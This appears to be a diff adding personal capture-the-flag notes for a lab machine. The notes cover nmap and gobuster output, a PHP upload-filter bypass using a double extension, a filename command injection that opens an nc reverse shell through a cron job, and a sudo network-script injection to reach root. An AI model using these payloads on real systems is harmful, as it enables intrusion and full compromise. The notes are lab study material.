@@ -1,0 +1,52 @@
+---NMAP SCAN---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+
+---GOBUSTER---
+/: (lowercase.txt):
+  /index.php (Status: 200)
+  /uploads (Status: 301)
+  /photos.php (Status: 200)
+  /upload.php (Status: 200)
+  /lib.php (Status: 200)
+  /backup (Status: 301)
+
+---ATTEMPTS---
+found a backup.tar
+file_mime_type ($file):
+  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'; (something like james/james.png; ANYTHING ELSE)
+the code checks for the MIME file type, the size and the extension
+to check the extension it just check the last characters, so bla.php.png would be accepted but bla.png.php wont
+in some old php versions, the php code will be execute even if the last extension name isnt .php, so bla.php.png will execute as a normal php code anyways
+uploading a file with GIF mime and with filename.php.png
+done!
+
+---PRIVESC---
+*./linpeas.sh:
+  root       3673  0.0  0.2 111200  2400 ?        Ss   13:32   0:00 sendmail: accepting connections
+  smmsp      3688  0.0  0.2 106612  2020 ?        Ss   13:32   0:00 sendmail: Queue runner@01:00:00 for /var/spool/clientmqueue
+
+in /home/guly a file that it is associated to cron execute "nohup /bin/rm -f $path$value > /dev/null 2>&1 &" the file name doesnt contain a ip number. To get code execute is pretty simple, if a semi-colon is on the filename, the bash line will execute a different command which will be a reverse shell. It will be something like this "nohup /bin/rm -f $path; nc -c /bin/bash IP PORT > /dev/null 2>&1 &".
+done!
+*whoami
+  guly
+*cat /home/guly/user.txt
+
+*sudo -l:
+  User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+this file only changes the ifcfg-XXXX variables
+this website https://seclists.org/fulldisclosure/2019/Apr/24 tells that is a variable is something like 'NAME=james whoami' the command whoami will be executed.
+*sudo /usr/local/sbin/changename.sh:
+  interface NAME:
+    james bash
+it will set the variable NAME to james and execute bash
+kudos!
+cat /root/root.txt
